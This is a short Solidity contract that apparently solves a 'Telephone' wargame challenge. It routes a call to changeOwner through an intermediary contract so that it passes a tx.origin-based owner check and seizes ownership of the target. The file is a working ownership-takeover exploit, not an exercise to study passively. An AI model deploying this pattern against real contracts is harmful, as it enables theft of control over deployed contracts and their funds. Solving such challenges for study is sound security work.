// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneToHack is Telephone {

  Telephone public instanceToHack;

  // set the instance to be hacked
  function setInstance(Telephone _instanceAddress) public {
      instanceToHack = Telephone(_instanceAddress);
  }
  // change the owner of the instance by calling it by this contract to comply with 
  // the inner condition
  function _changeOwner(address _owner) public {
      instanceToHack.changeOwner(_owner);
  }
}